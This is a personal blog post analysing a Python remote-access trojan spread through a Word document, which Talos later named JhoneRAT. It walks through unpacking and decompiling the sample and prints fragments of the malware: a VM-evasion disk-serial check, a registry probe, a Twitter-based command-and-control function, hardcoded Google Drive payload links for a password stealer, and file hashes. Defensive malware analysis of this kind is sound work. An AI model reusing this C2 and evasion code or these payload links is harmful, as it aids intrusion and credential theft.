---
layout: post
title:  "A new foe has appeared !"
date:   09-02-2020 13:34:34
categories: malware
---
![](/images/new-foe/new-foe.jpg){: width="600" height="600")}

Introduction
------------
The idea to finally set up my own blog stems from my first malware analysis where a word document was spotted on Twitter by one of my colleague. Following the Twitter thread shows that some researchers had already did some preliminary analysis but the main payload still needed to be unpacked and analized. After reaching out to one of the researcher (@Arkbird_SOLG) I was directed to a great tutorial about how to unpack python executable ([Tutorial][link1])

Sample
------
<blockquote class="twitter-tweet"><p lang="en" dir="ltr">interesting sample<br>maybe <a href="https://twitter.com/hashtag/APT?src=hash&amp;ref_src=twsrc%5Etfw">#APT</a><br>Hash:7c487d8462567a826da95c799591f5fb<br><br>Cc <a href="https://twitter.com/Arkbird_SOLG?ref_src=twsrc%5Etfw">@Arkbird_SOLG</a> <a href="https://twitter.com/ItsReallyNick?ref_src=twsrc%5Etfw">@ItsReallyNick</a> <a href="https://twitter.com/spider_girl22?ref_src=twsrc%5Etfw">@spider_girl22</a> <a href="https://twitter.com/DeadlyLynn?ref_src=twsrc%5Etfw">@DeadlyLynn</a> <a href="https://twitter.com/cyb3rops?ref_src=twsrc%5Etfw">@cyb3rops</a> <a href="https://t.co/migPtNcAJI">pic.twitter.com/migPtNcAJI</a></p>&mdash; @Rmy (@Rmy_Reserve) <a href="https://twitter.com/Rmy_Reserve/status/1217066627440635905?ref_src=twsrc%5Etfw">January 14, 2020</a></blockquote> <script async src="https://platform.twitter.com/widgets.js" charset="utf-8"></script>

As mentionned before, researchers had already figure out that the document was first downloading a dropper by reaching out to an googledrive link, downloading a picture from which the python RAT was extracted. 

![](/images/new-foe/new-foe/Mickey.jpg){: width="600" height="600")}

As a result, I headed to [AnyRun][link2] in order to fetch the RAT that I now needed to unpack. After running strings on the executable for good mesure, I cloned the [python-exe-unpacker][link3] and unpacked the file:
{% highlight bash%}
root@ubuntu:/opt/python-exe-unpacker$ sudo python python_exe_unpack.py -i prc.bin
[*] On Python 3.6
[*] Processing prc.bin
[*] Pyinstaller version: 2.1+
[*] This exe is packed using pyinstaller
[*] Unpacking the binary now
[*] Python version: 37
[*] Length of package: 6760411 bytes
[*] Found 39 files in CArchive
[*] Beginning extraction...please standby
[!] Warning: The script is running in a different python version than the one used to build the executable
    Run this script in Python37 to prevent extraction errors(if any) during unmarshalling
[*] Found 324 files in PYZ archive
[*] Successfully extracted pyinstaller exe.
{% endhighlight %}

Now that we have the compiled python script (.pyc) and the python libraries (.pyd) from the executable file, we need to uncompile our main executable which in this case is final2.

After failing to use sudo and getting some errors with uncompyle6:
{% highlight bash%}
root@ubuntu:/opt/python-exe-unpacker/unpacked/prc.bin$ uncompyle6
Traceback (most recent call last):
(...)
TypeError: not all arguments converted during string formatting
{% endhighlight %}

We realize that we need to change our file extension:

{% highlight bash%}
root@ubuntu:/opt/python-exe-unpacker/unpacked/prc.bin$ sudo uncompyle6 final2
# file final2
# path final2 must point to a .py or .pyc file
{% endhighlight %}

We are now greeted with yet another error:
{% highlight bash%}
root@ubuntu:/opt/python-exe-unpacker/unpacked/prc.bin$ sudo uncompyle6 final2.pyc
Traceback (most recent call last):
  File "/root/.local/lib/python3.6/site-packages/xdis/load.py", line 106, in load_module
    version = float(magics.versions[magic][:3])
KeyError: b'\xe3\x00\x00\x00'
(...)
TypeError: ord() expected string of length 1, but int found
{% endhighlight %}

This is due to the fact that the first 16-bytes of data on the header is missing. To find the missing bytes, we just need to open one of the other .pyc files available:

![](/images/new-foe/original.png){: width="600" height="600")}![](/images/new-foe/base64.png){: width="600" height="600")}

Now after struggling a bit, I found that instead of adding the value:

42 0D 0D 0A 00 00 00 00 00 00 00 00

to mimic the structure of the existing pyc files, I needed to actually add:

42 0D 0D 0A 00 00 00 00 00 00 00 00 00 00 00 00

And that the file was only getting decompiled on my windows environment...

Finaly we can uncompyle the file:
{% highlight python%}
C:\Users\root\Desktop>uncompyle6 final2.pyc
# uncompyle6 version 3.6.2
# Python bytecode 3.7 (3394)
# Decompiled from: Python 3.7.4 (tags/v3.7.4:e09359112e, Jul  8 2019, 19:29:22) [MSC v.1916 32 bit (Intel)]
# Embedded file name: final2.py
from requests import post, get
from datetime import datetime
from os import path, environ, remove, startfile
from bs4 import BeautifulSoup
from time import sleep, gmtime, strftime
import subprocess, threading, winreg as wreg
from base64 import b64decode, b64encode
from random import choice
import sys
tw = '@jhone87438316'
ss_id = '1FAIpQLSfCNzwaz4WoFfnvNZS99CeGMp86H3hNoHCtwira8uW_b3vYTQ'
ss_id_entry = 'entry.62933741'
out_id = '1FAIpQLSfwDQBvgZZfMu1LKviMuCdaWfYato07ac5tS5IZJS1XZ6BEbw'
out_user_entry = 'entry.1539892742'
out_result_entry = 'entry.1818065606'
fk = '1BmzeSxclQMmxiD-8SjnyxXQolx-44cJh'
t1 = '1JRWUcux5uocl9gNZ3f8Ue--P1kLjZkQC'
t2 = '1Z2Y_QZXvza28ZqLUuzmWiSElvcySBf2o'
ch = [
 'chrome', 'ccleaner', 'winrar', 'proc']
chimg = ['imag', 'pic', 'photo', 'cartoon']
u1 = choice(ch) + '.exe'
img = choice(chimg) + '.jpg'
txt = choice(ch) + '.txt'
(...)
# okay decompiling final2.pyc
{% endhighlight %}

The whole decompiled source is available [here][link4].

As only the fonction's name are obfuscated, it's fairly easy to understand the capability of the malware. As an example:
{% highlight bash%}
content1 = fct_exec('wmic diskdrive get SerialNumber /format:list').replace(' ', '').replace('SerialNumber=', '')
{% endhighlight %}
Getting the disk serial number as an VM evasion technique.

{% highlight bash%}
key = wreg.OpenKey(wreg.HKEY_CURRENT_USER, 'Keyboard Layout\\Preload', 0, wreg.KEY_ALL_ACCESS)
{% endhighlight %}
Checking the keyboard layout

We can also see that two payloads are hardcoded into the file. Both are hidden within an picture the same way the dropper was:

Jerry
-----
![](/images/new-foe/Jerry.jpg){: .img-left}

<br/>

| Source | Link |
|:--------|:-------|
| Google drive | https://drive.google.com/uc?export=qtypasadfzxcload&id=1JRWUcux5uocl9gNZ3f8Ue--P1kLjZkQC |
| Any.Run | https://app.any.run/tasks/da50d156-3183-46f0-ab13-722ee395d932 |
| VirusTotal | https://www.virustotal.com/gui/file/b994ae5cbfb5ad308656e9a8bf7a4a866fdeb9e23699f89f048d7f92e6bb8577/details |

<br/>

| Type | Value |
|:--------|:-------|
| MD5 | a1cd6a64e8f8ad5d4b6c07dc4113c7ec |
| SHA-1 | 60e2f48a51c061bba72a08f34be781354f87aa49 |
| SHA-256 | b994ae5cbfb5ad308656e9a8bf7a4a866fdeb9e23699f89f048d7f92e6bb8577 |  

Appears to be NirCmd. NirCmd is a small command-line utility that allows you to do some useful tasks without displaying any user interface. By running NirCmd with simple command-line option, you can write and delete values and keys in the Registry, write values into INI file, dial to your internet account or connect to a VPN network, restart windows or shut down the computer, create shortcut to a file, change the created/modified date of a file, change your display settings, turn off your monitor, open the door of your CD-ROM drive, and more...

Sunset
------
![](/images/new-foe/Sunset.jpg){: width="600" height="600")}

<br/>

| Source | Link |
|:--------|:-------|
| Google drive   | https://drive.google.com/uc?export=qtypasadfzxcload&id=1Z2Y_QZXvza28ZqLUuzmWiSElvcySBf2o |
| Any.Run   | https://app.any.run/tasks/0f400de0-00b1-4d7e-ae03-83130592a443 |
| VirusTotal   | https://www.virustotal.com/gui/file/9373556b150ca9f92f3a9100122eed9fc3024698be63c6ed4538b9d2027c43f1/detection |

<br/>

| Type | Value |
|:--------|:-------|
| MD5   | e3882832f8349d3686e6a6b83ed715c0 |
| SHA-1   | d4ff6784fb1e67f35cd3ee43e014f12e2b9a01ec |
| SHA-256   | 9373556b150ca9f92f3a9100122eed9fc3024698be63c6ed4538b9d2027c43f1 |

Appears to be a Password viewer/downloader.

C2
--
Finally we can also see that the RAT is using Twitter as a C2:

{% highlight python%}
def mjhd(name=tw):
    if name.startswith('@'):
        name = name[1:]
    url = 'https://twitter.com/' + name
    headers = {'User-Agent': 'Chrome/28.0.1500.52'}
    r = get(url, headers=headers)
    data = r.text
    print(r.status_code)
    soup = BeautifulSoup(data, 'html.parser')
    title = soup.title.text
    bio = soup.find('p', {'class': 'ProfileHeaderCard-bio'}).text
    tweets = soup.findAll('div', {'class': 'tweet'})
    m1 = tweets[:1][0].find('p').text
    print(m1)
    return m1

{% endhighlight %}

JhoneRAT
--------
For a more detailed analysis of this sample, Thalos actually published a very nice [writeup][link5]. two days after I finished my analysis. Needless to say that for a first stab at malware analysis, I was pretty excited when I realized that not only I managed to analyze the sample properly, but I was also able to warn our customers one day before Talos named the RAT.

Additional Ressources:
----------------------
https://zondatw.github.io/2019/pyinstaller_decompile/
https://www.fireeye.com/content/dam/fireeye-www/blog/pdfs/FlareOn6_Challenge7_Solution_WOPR.pdf
https://infosecuritygeek.com/reversing-a-simple-python-ransomware/
https://nedbatchelder.com/blog/200804/the_structure_of_pyc_files.html

[link1]:https://infosecuritygeek.com/reversing-a-simple-python-ransomware/  
[link2]:https://app.any.run/tasks/1d7567d9-0eac-4944-ba38-4894fdfe1c2f/
[link3]:https://github.com/countercept/python-exe-unpacker
[link4]:https://pastebin.com/KPYnUzV0
[link5]:https://blog.talosintelligence.com/2020/01/jhonerat.html?m=1
